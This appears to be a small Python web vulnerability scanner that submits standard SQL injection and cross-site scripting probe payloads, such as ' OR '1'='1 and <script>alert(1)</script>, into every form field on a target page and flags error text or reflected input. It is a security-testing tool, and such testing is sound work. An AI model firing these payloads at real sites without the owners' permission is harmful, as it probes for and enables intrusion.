pip install requests beautifulsoup4
sql_payloads = ["'", "' OR '1'='1", '" OR "1"="1', "';--", "' OR 'a'='a"]
xss_payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"', "'><img src=x onerror=alert(1)>"]
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def scan_url(target_url):
    print(f"Scanning {target_url} for vulnerabilities...\n")
    try:
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')

        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} forms on the page.\n")

        for i, form in enumerate(forms):
            action = form.get("action")
            method = form.get("method", "get").lower()
            form_url = urljoin(target_url, action)
            inputs = form.find_all("input")

            data = {}
            for input_tag in inputs:
                name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                if name:
                    if input_type == "text" or input_type == "search":
                        data[name] = "test"
                    else:
                        data[name] = "test"

            # SQL Injection Test
            print(f"\n[FORM {i+1}] Testing for SQL Injection...")
            for payload in sql_payloads:
                for name in data:
                    test_data = data.copy()
                    test_data[name] = payload
                    if method == "post":
                        res = requests.post(form_url, data=test_data)
                    else:
                        res = requests.get(form_url, params=test_data)
                    if "sql" in res.text.lower() or "error in your SQL" in res.text.lower():
                        print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
                        break

            # XSS Test
            print(f"[FORM {i+1}] Testing for XSS...")
            for payload in xss_payloads:
                for name in data:
                    test_data = data.copy()
                    test_data[name] = payload
                    if method == "post":
                        res = requests.post(form_url, data=test_data)
                    else:
                        res = requests.get(form_url, params=test_data)
                    if payload in res.text:
                        print(f"[!] XSS vulnerability detected with payload: {payload}")
                        break

    except Exception as e:
        print(f"[-] Error occurred: {e}")
